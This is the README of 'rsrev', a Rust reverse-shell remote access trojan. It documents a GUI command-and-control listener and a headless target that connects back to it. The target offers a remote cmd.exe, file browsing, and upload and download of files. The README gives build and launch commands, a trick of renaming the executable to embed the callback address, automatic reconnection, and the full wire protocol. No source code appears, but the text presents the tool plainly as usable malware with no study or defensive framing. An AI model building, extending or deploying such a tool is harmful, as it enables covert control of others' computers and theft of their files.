# rsrev

A minimal Rust reverse‑shell RAT with a GUI listener, headless target, remote shell,
and bidirectional file transfer. Built with **no async** — pure blocking I/O + threads.

```
target  ──TCP──►  listener  (egui GUI)
(console)         ┌─ Shell tab: remote cmd.exe
                  ├─ Files tab: browse, download, upload
                  └─ reconnection on disconnect
```

---

## Binaries

| Binary | Type | Description |
|--------|------|-------------|
| `listener` | GUI (egui) | C2 console – shell output, file manager, upload/download |
| `target` | Console | Connects to listener, executes commands, transfers files |

---

## Quick Start

```bash
# Build both binaries
cargo build --release

# Start the listener (port 4444)
./target/release/listener 4444

# In another terminal, connect the target
./target/release/target 127.0.0.1 4444
```

On the listener:
1. Click **Start Shell** to open a remote `cmd.exe`
2. Type commands in the input bar, hit Enter or click **Send**
3. Switch to the **Files** tab to browse the remote filesystem
4. Click **Upload File...** to send a local file via the native file dialog
5. Click **DL** next to any file to download it to the local directory

---

## How the target connects

The target parses the host and port from:

1. **CLI arguments**: `target 192.168.1.10 4444`
2. **Executable name**: rename `target.exe` to `target_192.168.1.10_4444.exe` – it will auto‑connect to that address

If the connection drops, the target automatically retries every 5 seconds.

---

## Wire Protocol

A single TCP connection carries all traffic. Two frame types are distinguished by a 1‑byte tag:

### Control messages (`0x00`)
JSON‑serialised `Message` enum with a 4‑byte little‑endian length prefix.

| Message | Direction | Purpose |
|---------|-----------|---------|
| `StartShell` / `StopShell` | Listener → Target | Shell lifecycle |
| `CmdInput(String)` | Listener → Target | Line sent to shell stdin |
| `CmdOutput(String)` | Target → Listener | Shell stdout/stderr |
| `ShellClosed` | Target → Listener | Shell process exited |
| `DownloadRequest(path)` | Listener → Target | Initiate file download |
| `UploadRequest(path)` | Listener → Target | Initiate file upload |
| `FileReady` / `FileDone` | Target → Listener / Listener → Target | Upload/download handshake |
| `FileError(msg)` | Either | Transfer error |
| `ListDir(path)` | Listener → Target | Request directory listing |
| `DirEntries(Vec<DirEntry>)` | Target → Listener | Directory contents |
| `Success` / `Error(msg)` | Either | Command ACK |
| `Exit` | Listener → Target | Clean shutdown |

### File chunks (`0x01`)
Raw binary with a 21‑byte header: `total_size(u64) + offset(u64) + is_last(u8) + data_len(u32)` followed by `data_len` bytes of payload. No base64, no JSON overhead.

Chunks are 64 KiB each.

---

## Project Structure

```
├── Cargo.toml
└── src/
     ├── protocol.rs    – Message/Frame/FileChunk enums, read/write helpers
     ├── listener.rs    – egui GUI (shell + file manager)
     └── target.rs      – Headless console target (reconnect loop)
```

### Dependencies

| Crate | Purpose |
|-------|---------|
| [`eframe`](https://crates.io/crates/eframe) | egui GUI framework + native window |
| [`rfd`](https://crates.io/crates/rfd) | Native Windows file‑open dialog |
| [`serde`](https://crates.io/crates/serde) + [`serde_json`](https://crates.io/crates/serde_json) | JSON message serialisation |

---

## Platform

- **Windows** – primary target. Tested on Windows 10/11.
- **Linux / macOS** – the target binary should compile and work (shell becomes `/bin/sh`). The GUI depends on eframe which supports all three platforms.

---

## License

GNU General Public License v3.0
